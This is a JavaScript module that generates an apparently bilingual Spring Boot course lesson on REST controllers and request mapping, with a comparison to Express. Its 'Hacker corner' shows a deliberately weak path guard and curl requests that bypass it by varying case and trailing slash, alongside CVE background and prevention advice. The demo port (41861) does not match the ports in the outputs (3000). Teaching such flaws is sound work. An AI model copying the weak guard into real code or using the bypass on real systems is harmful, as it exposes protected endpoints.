/**
 * spring-boot/s04-rest-controller.mjs — Chương 4: REST controller (soạn 19/11/2026, agent sb).
 * Mọi output là chạy thật: Spring Boot 4.1.2 / Spring Framework 7.0.10 / Jackson 3.1.7 trên Temurin 21.0.12.1, PostgreSQL 16 (container sb-c4-pg),
 * Express 5.3.0 trên Node 22 để so sánh. Mã demo: scratchpad/sb/lab/c4/rest (map, dto, json, pipe, rest), lab/c4/lab4/{starter,giai};
 * Node: ~/.rtq-sb/c4/node ; output: ~/.rtq-sb/c4/o. Các hằng MA.. / OUT.. sinh bằng tam/s04/build.sh + gen-ma.mjs.
 */
import { java, js, sql, bash, xml, props, out, tl, giai } from './_chung.mjs';

// ===== Bài 4.1 =====
const MA41_CTRL = java("@RestController                       // = @Controller + @ResponseBody trên mọi hàm\n@RequestMapping(\"/labs\")              // tiền tố chung cho cả class\npublic class LabController {\n\n    // Kho tạm trong RAM (Chương 6 thay bằng PostgreSQL). ConcurrentHashMap vì nhiều luồng Tomcat gọi cùng lúc.\n    private final Map<Long, Lab> labs = new ConcurrentHashMap<>();\n    private final AtomicLong seq = new AtomicLong();\n\n    public LabController() {\n        save(\"AI-01\", \"Lab AI\", \"Alpha\", 30);\n        save(\"IOT-02\", \"Lab IoT\", \"Beta\", 24);\n        save(\"NET-03\", \"Lab Mạng\", \"Alpha\", 36);\n    }\n\n    record LabRequest(String code, String name, String building, int capacity) {}\n    record LabPatch(String name, Integer capacity) {}            // null = \"không đổi\"\n\n    @GetMapping                                                   // GET /labs?building=Alpha&minCapacity=30\n    public List<Lab> list(@RequestParam(required = false) String building,\n                          @RequestParam(defaultValue = \"0\") int minCapacity) {\n        return labs.values().stream()\n                .filter(l -> building == null || l.building().equals(building))\n                .filter(l -> l.capacity() >= minCapacity)\n                .sorted(Comparator.comparingLong(Lab::id))\n                .toList();\n    }\n\n    @GetMapping(\"/count\")                                         // đường cố định thắng /{id}, khai trước hay sau đều vậy\n    public Map<String, Integer> count() {\n        return Map.of(\"count\", labs.size());\n    }\n\n    @GetMapping(\"/{id}\")                                          // GET /labs/2\n    public ResponseEntity<Lab> one(@PathVariable long id) {\n        Lab lab = labs.get(id);\n        return lab == null ? ResponseEntity.notFound().build() : ResponseEntity.ok(lab);\n    }\n\n    @PostMapping                                                  // POST /labs ⇒ 201 Created + Location\n    public ResponseEntity<Lab> create(@RequestBody LabRequest req) {\n        Lab lab = save(req.code(), req.name(), req.building(), req.capacity());\n        return ResponseEntity.created(URI.create(\"/labs/\" + lab.id())).body(lab);\n    }\n\n    @PutMapping(\"/{id}\")                                          // PUT = thay cả tài nguyên\n    public ResponseEntity<Lab> replace(@PathVariable long id, @RequestBody LabRequest req) {\n        if (!labs.containsKey(id)) return ResponseEntity.notFound().build();\n        Lab lab = new Lab(id, req.code(), req.name(), req.building(), req.capacity());\n        labs.put(id, lab);\n        return ResponseEntity.ok(lab);\n    }\n\n    @PatchMapping(\"/{id}\")                                        // PATCH = sửa một phần\n    public ResponseEntity<Lab> patch(@PathVariable long id, @RequestBody LabPatch p) {\n        Lab old = labs.get(id);\n        if (old == null) return ResponseEntity.notFound().build();\n        Lab lab = new Lab(id, old.code(), p.name() != null ? p.name() : old.name(), old.building(),\n                p.capacity() != null ? p.capacity() : old.capacity());\n        labs.put(id, lab);\n        return ResponseEntity.ok(lab);\n    }\n\n    @DeleteMapping(\"/{id}\")                                       // DELETE ⇒ 204 No Content\n    public ResponseEntity<Void> delete(@PathVariable long id) {\n        return labs.remove(id) == null ? ResponseEntity.notFound().build() : ResponseEntity.noContent().build();\n    }\n\n    private Lab save(String code, String name, String building, int capacity) {\n        long id = seq.incrementAndGet();\n        Lab lab = new Lab(id, code, name, building, capacity);\n        labs.put(id, lab);\n        return lab;\n    }\n}");
const OUT41_MAP = out("$ java … MapApp --logging.level.org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping=trace\n  c.c.c.m.LabController:\n  {PUT [/labs/{id}]}: replace(long,LabRequest)\n  {GET [/labs/count]}: count()\n  {GET [/labs]}: list(String,int)\n  {DELETE [/labs/{id}]}: delete(long)\n  {POST [/labs]}: create(LabRequest)\n  {PATCH [/labs/{id}]}: patch(long,LabPatch)\n  {GET [/labs/{id}]}: one(long)\n  c.c.c.m.PageController:\n  {GET [/hello]}: hello()\n  {GET [/hello-body]}: helloBody()\n… 11 mappings in 'requestMappingHandlerMapping'\n… Tomcat started on port 8080 (http) with context path '/'\n… Started MapApp in 2.15 seconds (process running for 2.91)");
const OUT41_GET = out("$ curl localhost:8080/labs\n[{\"id\":1,\"code\":\"AI-01\",\"name\":\"Lab AI\",\"building\":\"Alpha\",\"capacity\":30},{\"id\":2,\"code\":\"IOT-02\",\"name\":\"Lab IoT\",\"building\":\"Beta\",\"capacity\":24},{\"id\":3,\"code\":\"NET-03\",\"name\":\"Lab Mạng\",\"building\":\"Alpha\",\"capacity\":36}]\n$ curl 'localhost:8080/labs?building=Alpha&minCapacity=31'\n[{\"id\":3,\"code\":\"NET-03\",\"name\":\"Lab Mạng\",\"building\":\"Alpha\",\"capacity\":36}]\n$ curl localhost:8080/labs/2\n{\"id\":2,\"code\":\"IOT-02\",\"name\":\"Lab IoT\",\"building\":\"Beta\",\"capacity\":24}\n$ curl -i localhost:8080/labs/99\nHTTP/1.1 404 \nContent-Length: 0\n\n$ curl localhost:8080/labs/count\n{\"count\":3}");
const OUT41_WRITE = out("$ curl -i -X POST localhost:8080/labs -H 'Content-Type: application/json' -d '{\"code\":\"SEC-04\",\"name\":\"Lab Bảo mật\",\"building\":\"Beta\",\"capacity\":20}'\nHTTP/1.1 201 \nLocation: /labs/4\nContent-Type: application/json\nTransfer-Encoding: chunked\n\n{\"id\":4,\"code\":\"SEC-04\",\"name\":\"Lab Bảo mật\",\"building\":\"Beta\",\"capacity\":20}\n$ curl -X PUT localhost:8080/labs/4 -H 'Content-Type: application/json' -d '{\"code\":\"SEC-04\",\"name\":\"Lab An toàn\",\"building\":\"Gamma\",\"capacity\":28}'\n{\"id\":4,\"code\":\"SEC-04\",\"name\":\"Lab An toàn\",\"building\":\"Gamma\",\"capacity\":28}\n$ curl -X PATCH localhost:8080/labs/4 -H 'Content-Type: application/json' -d '{\"capacity\":32}'\n{\"id\":4,\"code\":\"SEC-04\",\"name\":\"Lab An toàn\",\"building\":\"Gamma\",\"capacity\":32}\n$ curl -i -X DELETE localhost:8080/labs/4\nHTTP/1.1 204 \n\n$ curl -i -X DELETE localhost:8080/labs/4\nHTTP/1.1 404 \nContent-Length: 0");
const OUT41_LOI = out("$ curl localhost:8080/labs/abc\n{\"timestamp\":\"2026-11-18T17:40:00.994Z\",\"status\":400,\"error\":\"Bad Request\",\"path\":\"/labs/abc\"}\n$ curl 'localhost:8080/labs?minCapacity=ba-muoi'\n{\"timestamp\":\"2026-11-18T17:40:01.051Z\",\"status\":400,\"error\":\"Bad Request\",\"path\":\"/labs\"}\n$ curl -i -X DELETE localhost:8080/labs\nHTTP/1.1 405 \nAllow: GET, POST\nContent-Type: application/json\nTransfer-Encoding: chunked\n\n{\"timestamp\":\"2026-11-18T17:40:01.071Z\",\"status\":405,\"error\":\"Method Not Allowed\",\"path\":\"/labs\"}\n$ curl -i localhost:8080/labs/\nHTTP/1.1 404 \nContent-Type: application/json\nTransfer-Encoding: chunked\n\n{\"timestamp\":\"2026-11-18T17:40:01.094Z\",\"status\":404,\"error\":\"Not Found\",\"path\":\"/labs/\"}\n$ curl localhost:8080/LABS\n{\"timestamp\":\"2026-11-18T17:40:01.109Z\",\"status\":404,\"error\":\"Not Found\",\"path\":\"/LABS\"}\n$ curl -I localhost:8080/labs\nHTTP/1.1 200 \nContent-Type: application/json\nContent-Length: 226\n\n$ curl -i -X OPTIONS localhost:8080/labs/2\nHTTP/1.1 200 \nAllow: DELETE,GET,HEAD,PUT,PATCH,OPTIONS\nAccept-Patch: \nContent-Length: 0");
const OUT41_WARN = out("WARN … .w.s.m.s.DefaultHandlerExceptionResolver : Resolved [org.springframework.web.method.annotation.MethodArgumentTypeMismatchException: Method parameter 'id': Failed to convert value of type 'java.lang.String' to required type 'long'; For input string: \"abc\"]\nWARN … .w.s.m.s.DefaultHandlerExceptionResolver : Resolved [org.springframework.web.method.annotation.MethodArgumentTypeMismatchException: Method parameter 'minCapacity': Failed to convert value of type 'java.lang.String' to required type 'int'; For input string: \"ba-muoi\"]\nWARN … .w.s.m.s.DefaultHandlerExceptionResolver : Resolved [org.springframework.web.HttpRequestMethodNotSupportedException: Request method 'DELETE' is not supported]");
const MA41_PAGE = java("@Controller                       // KHÔNG có @ResponseBody: chuỗi trả về bị hiểu là TÊN VIEW (trang HTML)\npublic class PageController {\n\n    @GetMapping(\"/hello\")\n    public String hello() {\n        return \"hello\";\n    }\n\n    @GetMapping(\"/hello-body\")\n    @ResponseBody                 // thêm vào thì chuỗi mới đi thẳng ra body\n    public String helloBody() {\n        return \"hello\";\n    }\n}");
const OUT41_VIEW = out("$ curl -i localhost:8080/hello\nHTTP/1.1 500 \nContent-Type: application/json;charset=UTF-8\nContent-Language: en-US\nTransfer-Encoding: chunked\nConnection: close\n\n{\"timestamp\":\"2026-11-18T17:39:17.793Z\",\"status\":500,\"error\":\"Internal Server Error\",\"path\":\"/hello\"}\n$ curl localhost:8080/hello-body\nhello\n# log của server:\nERROR … Circular view path [hello]: would dispatch back to the current handler URL [/hello] again. Check your ViewResolver setup!");
const MA41_EXPRESS = js("// labs.mjs — cùng API /labs viết bằng Express 5 để so với Spring (bài 4.1)\nimport express from 'express';\nconst app = express();\napp.use(express.json());\nconst labs = [\n  { id: 1, code: 'AI-01', name: 'Lab AI', building: 'Alpha', capacity: 30 },\n  { id: 2, code: 'IOT-02', name: 'Lab IoT', building: 'Beta', capacity: 24 },\n  { id: 3, code: 'NET-03', name: 'Lab Mạng', building: 'Alpha', capacity: 36 },\n];\napp.get('/labs', (req, res) => {\n  const min = Number(req.query.minCapacity ?? 0);             // \"ba-muoi\" ⇒ NaN, không ai báo lỗi\n  res.json(labs.filter((l) => (!req.query.building || l.building === req.query.building) && l.capacity >= min));\n});\napp.get('/labs/:id', (req, res) => {                          // khai TRƯỚC /labs/count\n  const lab = labs.find((l) => l.id === Number(req.params.id));\n  lab ? res.json(lab) : res.status(404).json({ error: 'not found' });\n});\napp.get('/labs/count', (req, res) => res.json({ count: labs.length }));  // không bao giờ tới được\napp.listen(41861, () => console.log('Express 5 on :41861'));");
const OUT41_EXPRESS = out("$ curl localhost:3000/labs/count\n{\"error\":\"not found\"}\n$ curl localhost:3000/labs/abc\n{\"error\":\"not found\"}\n$ curl 'localhost:3000/labs?minCapacity=ba-muoi'\n[]\n$ curl localhost:3000/labs/\n[{\"id\":1,\"code\":\"AI-01\",\"name\":\"Lab AI\",\"building\":\"Alpha\",\"capacity\":30},{\"id\":2,\"code\":\"IOT-02\",\"name\":\"Lab IoT\",\"building\":\"Beta\",\"capacity\":24},{\"id\":3,\"code\":\"NET-03\",\"name\":\"Lab Mạng\",\"building\":\"Alpha\",\"capacity\":36}]");
const MA41_BYPASS = js("// bypass.mjs — luật bảo vệ so chuỗi đường dẫn KHÁC cách router khớp đường dẫn (minh hoạ lớp lỗi CVE-2016-5007 / issue #28552)\nimport express from 'express';\nconst app = express();\napp.use((req, res, next) => {                       // \"bảo vệ\" viết tay: chỉ chặn đúng chuỗi '/admin/stats'\n  if (req.path === '/admin/stats' && req.get('X-Role') !== 'ADMIN') return res.status(403).json({ error: 'forbidden' });\n  next();\n});\napp.get('/admin/stats', (req, res) => res.json({ students: 1240, revenue: '48.000.000 VND' }));\napp.listen(41861, () => console.log('Express 5 on :41861'));");
const OUT41_BYPASS = out("$ curl localhost:3000/admin/stats\n{\"error\":\"forbidden\"}\n$ curl localhost:3000/admin/stats/\n{\"students\":1240,\"revenue\":\"48.000.000 VND\"}\n$ curl localhost:3000/ADMIN/stats\n{\"students\":1240,\"revenue\":\"48.000.000 VND\"}");
const MA41_GIAI = java("/** Lời giải thực hành 4.1: tìm theo mã (không phân biệt hoa thường) + id chỉ nhận chữ số. */\n@RestController\n@RequestMapping(\"/labs\")\npublic class LabController {\n    record Lab(long id, String code, String name) {}\n\n    private final List<Lab> labs = List.of(new Lab(1, \"AI-01\", \"Lab AI\"), new Lab(2, \"IOT-02\", \"Lab IoT\"));\n\n    @GetMapping(\"/{id:\\\\d+}\")                                   // biểu thức chính quy: \"abc\" không khớp ⇒ 404, không phải 400\n    public ResponseEntity<Lab> one(@PathVariable long id) {\n        return ResponseEntity.of(labs.stream().filter(l -> l.id() == id).findFirst());\n    }\n\n    @GetMapping(\"/by-code/{code}\")\n    public ResponseEntity<Lab> byCode(@PathVariable String code) {\n        return ResponseEntity.of(labs.stream().filter(l -> l.code().equalsIgnoreCase(code)).findFirst());\n    }\n}");
const OUT41_GIAI = out("$ curl -i localhost:8080/labs/by-code/ai-01\nHTTP/1.1 200 \n{\"id\":1,\"code\":\"AI-01\",\"name\":\"Lab AI\"}\n$ curl -i localhost:8080/labs/by-code/XYZ\nHTTP/1.1 404 \n\n$ curl -i localhost:8080/labs/abc\nHTTP/1.1 404 \n{\"timestamp\":\"2026-11-18T18:05:55.778Z\",\"status\":404,\"error\":\"Not Found\",\"path\":\"/labs/abc\"}\n$ curl -i localhost:8080/labs/2\nHTTP/1.1 200 \n{\"id\":2,\"code\":\"IOT-02\",\"name\":\"Lab IoT\"}");

const L41_EN = `
<div class="ml-en">
<span class="eyebrow">Chapter 4 · Lesson 4.1</span>
<h2>@RestController and request mapping</h2>
<p class="lead">Chapter 3 showed how Spring builds and wires your objects. This chapter is about the door they sit behind: HTTP. A request arrives as text — a method, a path, some headers, maybe a body — and something has to decide <em>which Java method</em> runs and how its return value becomes a response. In Spring MVC that something is a table of mappings built at startup from your annotations. We build the LabFlow <code>/labs</code> resource with all five verbs, read the mapping table Spring prints, break it on purpose (wrong type, wrong method, a trailing slash, a forgotten <code>@ResponseBody</code>), and run the same routes in Express 5 to see where the two frameworks behave differently — one of those differences is a whole class of security bugs.</p>

<h3>In everyday life first</h3>
<p>Think of the reception desk of the Alpha building. A visitor says two things: <em>where</em> ("room 2, Lab IoT") and <em>what</em> ("I want to look at it", "I want to book it", "I want to cancel"). The receptionist has a printed table: room + request type ⇒ which staff member handles it. HTTP is the same. The path (<code>/labs/2</code>) says where, the method (<code>GET</code>, <code>POST</code>, <code>PUT</code>, <code>PATCH</code>, <code>DELETE</code>) says what, and Spring's mapping table says which method of which controller answers. If the room exists but nobody handles that kind of request, the receptionist says "we only do viewing and booking here" — that is <strong>405 Method Not Allowed</strong> with an <code>Allow</code> header. If the room does not exist at all: <strong>404</strong>.</p>

<h3>The controller</h3>
${MA41_CTRL}
<div class="kv-grid">
  <div class="kv"><span class="k">@RestController</span><span class="v">A <code>@Controller</code> (a bean found by component scanning — lesson 3.3) plus <code>@ResponseBody</code> on every method: the return value is written to the response body (as JSON, by Jackson — lesson 4.3), not treated as the name of an HTML page.</span></div>
  <div class="kv"><span class="k">@RequestMapping("/labs")</span><span class="v">A prefix shared by every method of the class.</span></div>
  <div class="kv"><span class="k">@GetMapping, @PostMapping, @PutMapping, @PatchMapping, @DeleteMapping</span><span class="v">Shortcuts for <code>@RequestMapping(method = …)</code>. The path is relative to the class prefix.</span></div>
  <div class="kv"><span class="k">@PathVariable</span><span class="v">A piece of the path: <code>/labs/{id}</code> ⇒ <code>long id</code>. Spring converts the text <code>"2"</code> to <code>long</code>. The name comes from the parameter name (Spring Boot's Maven/Gradle setup compiles with <code>-parameters</code>, so you do not need to repeat it).</span></div>
  <div class="kv"><span class="k">@RequestParam</span><span class="v">A query-string value: <code>?building=Alpha&amp;minCapacity=30</code>. Required by default; <code>required = false</code> gives <code>null</code>; <code>defaultValue</code> gives a fallback (and makes it optional).</span></div>
  <div class="kv"><span class="k">ResponseEntity&lt;T&gt;</span><span class="v">Body + status + headers in one object. Use it when the status is not always 200: <code>notFound()</code>, <code>created(uri)</code>, <code>noContent()</code>.</span></div>
</div>
<p>One detail to notice now: the controller is a <strong>singleton</strong> called by many Tomcat threads at once (lesson 3.4). That is why the temporary in-memory store is a <code>ConcurrentHashMap</code> with an <code>AtomicLong</code> — a plain <code>HashMap</code> and <code>long</code> counter would lose updates under load, exactly like the <code>count++</code> experiment of lesson 2.4. From Chapter 6 the data lives in PostgreSQL and the controller holds no state at all.</p>

<h3>The mapping table Spring builds at startup</h3>
<p>Turn the log level of <code>RequestMappingHandlerMapping</code> up to TRACE and Spring prints every route it registered:</p>
${OUT41_MAP}
<ul>
  <li>Eleven mappings: seven from <code>LabController</code>, two from <code>PageController</code> (below), two for <code>/error</code> that Spring Boot adds itself — the endpoint that writes the JSON error bodies you are about to see.</li>
  <li>The order in the log is not the order of matching. When several patterns match a path, Spring picks the <strong>most specific</strong> one: a literal <code>/labs/count</code> beats the variable <code>/labs/{id}</code> whatever order you wrote them in. Keep that in mind for the Express comparison.</li>
  <li>When the table is not what you expect (a controller in a package outside the scan — lesson 0.2, a typo in the path), this log is the fastest way to find out. In production the same table is available at <code>/actuator/mappings</code> (Chapter 15) — which should not be public.</li>
</ul>

<h3>Reading: GET</h3>
${OUT41_GET}
<p>A missing lab gives <code>404</code> with an empty body, because <code>ResponseEntity.notFound().build()</code> has no body. Chapter 5 turns every error into a proper <code>application/problem+json</code> body (RFC 9457); for now the status code is what matters. Note also that <code>/labs/count</code> was answered by <code>count()</code>, not by <code>one(long)</code> with an impossible id.</p>

<h3>Writing: POST, PUT, PATCH, DELETE</h3>
${OUT41_WRITE}
<div class="kv-grid">
  <div class="kv"><span class="k">POST /labs</span><span class="v">Creates. <strong>201 Created</strong> + <code>Location: /labs/4</code> tells the client where the new resource lives. Not idempotent: sending it twice creates two labs (lesson 4.5 fixes that for bookings).</span></div>
  <div class="kv"><span class="k">PUT /labs/4</span><span class="v">Replaces the whole resource with what you sent. Idempotent: sending the same PUT ten times leaves the same state.</span></div>
  <div class="kv"><span class="k">PATCH /labs/4</span><span class="v">Changes only the fields sent. Here <code>{"capacity":32}</code> kept the name. In our record, <code>null</code> means "not sent" — which also means a client cannot set a field to null with this PATCH (lesson 5.4 discusses the options).</span></div>
  <div class="kv"><span class="k">DELETE /labs/4</span><span class="v"><strong>204 No Content</strong>: done, nothing to return. The second DELETE gives 404 — the <em>state</em> is the same (lab gone), so DELETE is still idempotent even though the status differs.</span></div>
</div>
<p><strong>Safe</strong> methods (GET, HEAD, OPTIONS) must not change anything; <strong>idempotent</strong> methods (the safe ones + PUT, DELETE) may be repeated without extra effect. Browsers, proxies and HTTP clients rely on this: they retry idempotent requests automatically after a network error, and never retry POST on their own. A "GET /labs/4/delete" endpoint breaks that promise — a link preview bot or a prefetching browser would delete your lab.</p>

<h3>Breaking it on purpose</h3>
${OUT41_LOI}
<ul>
  <li><strong><code>/labs/abc</code> ⇒ 400.</strong> The path matched <code>/labs/{id}</code>, but <code>"abc"</code> cannot become a <code>long</code>. Same for <code>minCapacity=ba-muoi</code>. Spring refuses to call your method with garbage — and logs exactly why (below).</li>
  <li><strong><code>DELETE /labs</code> ⇒ 405 + <code>Allow: GET, POST</code>.</strong> The path exists, the method does not.</li>
  <li><strong><code>/labs/</code> and <code>/LABS</code> ⇒ 404.</strong> Since Spring Framework 6 a trailing slash is a different path, and paths are case-sensitive. (Spring Boot 2 matched <code>/labs/</code> to <code>/labs</code>; many apps got 404s after upgrading. The reason it was removed is the security section below.)</li>
  <li><strong>HEAD and OPTIONS come free.</strong> <code>HEAD</code> runs the GET handler and drops the body (note the <code>Content-Length: 226</code>); <code>OPTIONS</code> lists the allowed methods.</li>
</ul>
${OUT41_WARN}
<p>Those WARN lines are the first thing to read when a client says "your API returns 400 and I don't know why". The response body says almost nothing on purpose — by default Spring Boot does not send exception messages to clients (lesson 5.2 explains what to send instead).</p>

<h3>The classic beginner bug: @Controller without @ResponseBody</h3>
${MA41_PAGE}
${OUT41_VIEW}
<p>With plain <code>@Controller</code>, the string <code>"hello"</code> is the <em>name of a view</em> (an HTML template). This project has no template engine, so Spring falls back to forwarding to the URL <code>hello</code> — which is the same handler — and stops with "Circular view path" and a 500. With Thymeleaf on the classpath you would get a different error ("template not found"). The fix is <code>@ResponseBody</code>, or simply <code>@RestController</code> for an API. If you used Servlet/JSP in PRJ301, this is the difference between a controller that returns a page and one that returns data.</p>

<h3>Compared with Express</h3>
<p>The same API in Express 5, with the routes written in the "natural" order:</p>
${MA41_EXPRESS}
${OUT41_EXPRESS}
<div class="kv-grid">
  <div class="kv"><span class="k">Route order</span><span class="v">Express tries routes <strong>in the order you registered them</strong>; <code>/labs/:id</code> was first, so <code>/labs/count</code> became <code>id = "count"</code> ⇒ 404. Spring chooses by specificity, so order does not matter. In Express you must register literals before parameters.</span></div>
  <div class="kv"><span class="k">Types</span><span class="v">Everything in <code>req.params</code>/<code>req.query</code> is a string. <code>Number("ba-muoi")</code> is <code>NaN</code>, every comparison with <code>NaN</code> is false ⇒ a silent empty list with 200. Spring converts to the declared type and answers 400. In Express you validate yourself (zod — Node.js lesson 6.3).</span></div>
  <div class="kv"><span class="k">Trailing slash</span><span class="v">Express (non-strict routing by default) answers <code>/labs/</code> like <code>/labs</code>; Spring 6+ does not.</span></div>
  <div class="kv"><span class="k">Interview line</span><span class="v">"Express is a list of middleware tried in order; Spring MVC is a lookup table built from annotations at startup, choosing the most specific match, with typed arguments converted for you."</span></div>
</div>

<h3>🕵️ Hacker corner — when the guard and the router read the URL differently</h3>
<p>A security rule is only as good as its agreement with the router. If the code that <em>protects</em> a path compares strings one way and the code that <em>routes</em> the path matches another way, an attacker sends a URL that the guard thinks is harmless and the router still delivers to the protected handler. Here is the smallest possible version in Express — a hand-written check for the exact string <code>/admin/stats</code>:</p>
${MA41_BYPASS}
${OUT41_BYPASS}
<p>The guard compares with <code>===</code>; the router is case-insensitive and ignores the trailing slash. Two characters of difference, full bypass.</p>
<div class="callout warn"><p><strong>Real cases in Spring.</strong> <strong>CVE-2016-5007</strong> (spring.io, 7 July 2016, "Spring Security / MVC Path Matching Inconsistency"): Spring Security and Spring MVC matched patterns with different strictness — for example trimming spaces in path segments — so some paths that Spring MVC mapped to protected controllers were not recognised as protected by Spring Security. Fixed in Spring Security 4.1.1; the advisory also recommends letting Spring MVC do the matching for Security (<code>MvcRequestMatcher</code>) and adding method-level checks. In <strong>June 2022</strong> the Spring team opened issue <strong>#28552</strong>, "Deprecate trailing slash match and change default value from true to false", with exactly this argument: a rule for <code>/resources</code> and a rule for <code>/resources/**</code> plus trailing-slash matching let a user reach the admin-only endpoint via <code>/resources/</code>. That is why Spring Framework 6 answers 404 to <code>/labs/</code> above.</p>
<p><strong>How to prevent it:</strong> let the framework that routes also decide what is protected (Spring Security uses Spring MVC's own matcher — Chapter 9); deny by default and allow explicitly; protect the method too (<code>@PreAuthorize</code>), not only the URL; never hand-roll path checks with string comparison; test the variants (<code>/x/</code>, <code>/X</code>, <code>/x;a=b</code>, <code>/x%2F</code>) in your security tests (Chapter 11).</p></div>

<h3>In real life and at work</h3>
<ul>
  <li><strong>After upgrading to Spring Boot 3+</strong> (illustration of a very common ticket): the mobile app builds URLs as <code>baseUrl + "/"</code> + path and some calls end with <code>/</code>. Everything worked on Boot 2; after the upgrade those calls get 404. Fix the client or add explicit mappings — do not re-enable global trailing-slash matching without thinking about your security rules.</li>
  <li><strong>Reading someone else's project</strong> (SWP391, a new job): start the app with the TRACE line above and you have the full list of endpoints in five seconds — faster than opening every controller.</li>
  <li><strong>Front-end developers</strong> will judge your API by its status codes: 201 + Location after a create, 204 after a delete, 404 vs 405 vs 400 that mean what they say. The rest of this chapter is about making those answers precise.</li>
</ul>

<h3>🎤 What the interviewer will ask</h3>
<ol>
  <li><strong>"@Controller vs @RestController?"</strong> — <code>@RestController</code> = <code>@Controller</code> + <code>@ResponseBody</code>: return values are serialised into the body instead of being resolved as view names. Forgetting it gives "Circular view path" or "template not found".</li>
  <li><strong>"@PathVariable vs @RequestParam?"</strong> — Part of the path identifying the resource (<code>/labs/2</code>) vs query-string options such as filters, sorting, paging (<code>?building=Alpha</code>). Both are converted to the declared type; conversion failure ⇒ 400.</li>
  <li><strong>"PUT vs PATCH? Which methods are idempotent?"</strong> — PUT replaces the whole resource, PATCH changes part of it. Idempotent: GET, HEAD, OPTIONS, PUT, DELETE. POST is not — which is why retrying a POST needs an idempotency key (lesson 4.5).</li>
  <li><strong>"Two mappings match the same URL — which wins?"</strong> — The most specific pattern (literal segments beat variables, fewer wildcards beat more), independent of declaration order. Express, by contrast, uses registration order.</li>
  <li><strong>"Why does /users/ return 404 after upgrading to Spring Boot 3?"</strong> — Spring Framework 6 no longer matches a trailing slash by default (issue #28552), because the mismatch with security rules was a source of bypasses.</li>
</ol>

<h3>🧪 Practice (20 minutes)</h3>
<div class="callout ok"><ol>
  <li>Add <code>GET /labs/by-code/{code}</code> that finds a lab by its code, ignoring case (<code>ai-01</code> finds <code>AI-01</code>), 404 when there is none.</li>
  <li>Make <code>GET /labs/{id}</code> accept only digits, so <code>/labs/abc</code> gives <strong>404</strong> (no such resource) instead of 400 — without writing an <code>if</code>.</li>
</ol>
<p><strong>Done when:</strong> <code>/labs/by-code/ai-01</code> ⇒ 200, <code>/labs/by-code/XYZ</code> ⇒ 404, <code>/labs/abc</code> ⇒ 404, <code>/labs/2</code> ⇒ 200.</p></div>
${giai('Show one solution', `${MA41_GIAI}
${OUT41_GIAI}
<p><code>{id:\\d+}</code> is a regular expression inside the path pattern: a path that does not match it does not match the mapping at all, so the request ends at 404 before any conversion happens.</p>`)}

<h3>🗂 Key terms</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Handler mapping</span><span class="v">The table "method + path ⇒ controller method", built at startup from annotations.</span></div>
  <div class="kv"><span class="k">@RestController</span><span class="v"><code>@Controller</code> + <code>@ResponseBody</code>: return values become the response body.</span></div>
  <div class="kv"><span class="k">@PathVariable / @RequestParam</span><span class="v">Value from a path segment / from the query string, converted to the declared type.</span></div>
  <div class="kv"><span class="k">ResponseEntity</span><span class="v">Status + headers + body returned together.</span></div>
  <div class="kv"><span class="k">Safe / idempotent</span><span class="v">Does not change state / repeating it has no extra effect.</span></div>
  <div class="kv"><span class="k">405 + Allow</span><span class="v">The path exists but not for this method; the header lists the methods that do work.</span></div>
</div>

<h3>📌 Summary</h3>
<ul>
  <li>Spring MVC turns annotations into a mapping table at startup; the most specific pattern wins, and arguments are converted to their declared types (400 if they cannot be).</li>
  <li>Use the method that matches the intent and the status that matches the result: 200, 201 + Location, 204, 400, 404, 405.</li>
  <li><code>@Controller</code> without <code>@ResponseBody</code> looks for a view — for an API use <code>@RestController</code>.</li>
  <li>Express matches in registration order with string values and lenient slashes; Spring matches by specificity with typed values and exact paths — and that exactness is a security feature.</li>
</ul>

<h3>📚 Go deeper</h3>
${tl('https://docs.spring.io/spring-framework/reference/web/webmvc/mvc-controller/ann-requestmapping.html', '🌱', 'Spring Framework — Mapping Requests', 'URI patterns, pattern comparison, consumes/produces, HEAD and OPTIONS.')}
${tl('https://github.com/spring-projects/spring-framework/issues/28552', '🐙', 'spring-framework #28552 — Deprecate trailing slash match', 'The 2022 discussion with the security example behind the Spring 6 change.')}

<h3>Sources</h3>
<ul>
  <li>Outputs above: MapApp and GiaiApp on Spring Boot 4.1.2 / Spring Framework 7.0.10 / Tomcat 11.0.27, Temurin 21.0.12.1; Express 5.3.0 on Node 22.22.2 (19/11/2026).</li>
  <li>Spring advisory CVE-2016-5007 (07/07/2016): <a href="https://spring.io/security/cve-2016-5007" target="_blank" rel="noopener">spring.io/security/cve-2016-5007</a></li>
  <li>Spring Framework issue #28552 (01/06/2022): <a href="https://github.com/spring-projects/spring-framework/issues/28552" target="_blank" rel="noopener">github.com/spring-projects/spring-framework/issues/28552</a></li>
  <li>RFC 9110 (HTTP Semantics), sections 9.2.1 safe and 9.2.2 idempotent methods.</li>
</ul>
</div>
`;

const L41_VI = `
<div class="ml-vi">
<span class="eyebrow">Chương 4 · Bài 4.1</span>
<h2>@RestController và request mapping</h2>
<p class="lead">Chương 3 cho thấy Spring dựng và nối các đối tượng của bạn thế nào. Chương này nói về cánh cửa đứng trước chúng: HTTP. Một request tới dưới dạng chữ — một phương thức, một đường dẫn, vài header, có thể có body — và phải có thứ gì đó quyết định <em>hàm Java nào</em> chạy, giá trị trả về biến thành response ra sao. Trong Spring MVC, thứ đó là một bảng ánh xạ (mapping) dựng lúc khởi động từ các annotation của bạn. Ta dựng tài nguyên <code>/labs</code> của LabFlow với đủ năm phương thức, đọc bảng ánh xạ Spring in ra, cố tình làm hỏng (sai kiểu, sai phương thức, thừa dấu "/" cuối, quên <code>@ResponseBody</code>), rồi chạy cùng các route trên Express 5 để thấy hai framework khác nhau ở đâu — một trong những chỗ khác đó là cả một họ lỗi bảo mật.</p>

<h3>Đời thường trước đã</h3>
<p>Hãy nghĩ tới quầy lễ tân toà Alpha. Khách nói hai điều: <em>ở đâu</em> ("phòng 2, Lab IoT") và <em>làm gì</em> ("tôi muốn xem", "tôi muốn đặt", "tôi muốn huỷ"). Lễ tân có một bảng in sẵn: phòng + loại yêu cầu ⇒ nhân viên nào lo. HTTP cũng vậy. Đường dẫn (<code>/labs/2</code>) nói ở đâu, phương thức (<code>GET</code>, <code>POST</code>, <code>PUT</code>, <code>PATCH</code>, <code>DELETE</code>) nói làm gì, và bảng ánh xạ của Spring nói hàm nào của controller nào trả lời. Nếu phòng có thật nhưng không ai lo loại yêu cầu đó, lễ tân nói "ở đây chỉ xem và đặt thôi" — đó là <strong>405 Method Not Allowed</strong> kèm header <code>Allow</code>. Nếu phòng không tồn tại: <strong>404</strong>.</p>

<h3>Controller</h3>
${MA41_CTRL}
